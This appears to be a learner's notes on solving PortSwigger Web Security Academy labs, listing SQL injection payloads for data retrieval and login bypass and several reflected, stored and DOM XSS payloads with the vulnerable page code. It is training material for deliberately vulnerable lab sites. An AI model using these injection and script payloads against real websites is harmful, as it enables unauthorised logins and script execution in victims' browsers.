Port Swigger Labs 

SQLi
1) Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Solution: Since it was my first lab and I couldn't figure it out on my own. with some help 
the given SQL query was: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
to solve the lab I typed  ' OR 1=1 --  in the URL after categories= to solve the lab

2)Lab: SQL injection vulnerability allowing login bypass
Solution: I first checked for unsanitized text field, typing a ' into the username test field. 
This gav e=me an internal server error which confirmed that the site was indeed vulnerable to SQLi, then based on a guess of the SQL query
guess: SELECT firtname FORM users WHERE username='admin ' AND password =' something'
payload: administrator'-- 
this completely comments out the AND condition and logs me in as the administrator


Cross site scripting (XSS)

1) Lab: Reflected XSS into HTML context with nothing encoded
Solution: Again this was my fist XSS lab so I couldn't solve it on my own. 
I typed <script>alert(1)</script> into the search bar to solve the lab

2) Lab: Stored XSS into HTML context with nothing encoded
Solution: I typed into the comment section to solve the lab

3) Lab: DOM XSS in document.write sink using source location.search
Solution: 
    <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>

This was the javascript code that the website was using in the search field.
so I injected '">' <script>alert(1)</script>// into the search query to solve the lab

4) Lab: DOM XSS in innerHTML sink using source location.search
Solution:              <script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>

innerHTML edits the contents of an HTML div
here:  <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
is the code that we are concerned with:
I injected <img src=x onerror=alert(1)> into the search field to solve the lab

5) Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
Solution: I modified the URL to include: ?returnPath=javascript:alert(document.cookie)
and then clicked on "back" link to solve the lab

6) 
Solution: I couldn't understand this one on my own so I had to see the solution
I typed <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> 
on the exploit server to solve the lab
